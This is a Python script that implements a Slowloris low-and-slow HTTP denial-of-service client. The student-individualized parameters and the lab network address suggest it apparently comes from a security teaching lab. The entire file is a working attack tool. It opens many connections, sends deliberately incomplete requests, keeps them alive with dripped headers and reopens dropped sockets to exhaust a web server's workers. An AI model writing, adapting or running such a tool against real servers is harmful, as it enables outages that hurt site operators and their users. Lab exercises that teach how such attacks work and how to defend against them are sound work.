#!/usr/bin/env python3
"""Slowloris low-and-slow HTTP DoS client (custom implementation).

Opens many TCP connections to the victim, sends an incomplete HTTP request on
each, and keeps every socket alive by dripping a single extra header byte at a
fixed interval -- never sending the blank line that would complete the request.
A prefork server dedicates a worker to each connection and runs out of workers.

NUM_CONNECTIONS and DRIP_SECONDS are individualized per student by
parameter.config (RAND_REPLACE); the literals below are defaults for local runs.
"""

import socket
import sys
import time
import random

TARGET_HOST = "172.25.0.10"   # victim on SLNET
TARGET_PORT = 80

# ---- Individualized by parameter.config (RAND_REPLACE) ----
N_CONN = NUM_CONNECTIONS      # number of concurrent connections to hold open
DRIP_SECONDS = DRIP_SECONDS   # seconds between keep-alive header bytes
# ----------------------------------------------------------

LOG_PATH = "/var/log/slowloris.log"


def log(msg):
    line = "%s SLOWLORIS %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    print(line, flush=True)
    try:
        with open(LOG_PATH, "a") as fh:
            fh.write(line + "\n")
    except PermissionError:
        pass


def open_socket():
    """Open one connection and send a partial request (no terminating CRLF)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.send(b"GET /?%d HTTP/1.1\r\n" % random.randint(0, 2000))
    s.send(b"Host: %s\r\n" % TARGET_HOST.encode())
    s.send(b"User-Agent: Mozilla/5.0 (slow-client)\r\n")
    s.send(b"Accept-language: en-US,en\r\n")
    # NOTE: intentionally no final blank line -- the request stays incomplete.
    return s


def main():
    log("start target=%s:%d connections=%d drip=%ds"
        % (TARGET_HOST, TARGET_PORT, N_CONN, DRIP_SECONDS))

    sockets = []
    for _ in range(N_CONN):
        try:
            sockets.append(open_socket())
        except socket.error:
            break
    log("opened %d sockets" % len(sockets))

    # Keep the connections alive by dripping one extra header byte periodically.
    while True:
        log("keep-alive drip on %d sockets" % len(sockets))
        for s in list(sockets):
            try:
                s.send(b"X-a: %d\r\n" % random.randint(1, 5000))
            except socket.error:
                sockets.remove(s)
        # Re-open any sockets the server reclaimed, to sustain the pressure.
        while len(sockets) < N_CONN:
            try:
                sockets.append(open_socket())
            except socket.error:
                break
        time.sleep(DRIP_SECONDS)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("stopped")
        sys.exit(0)
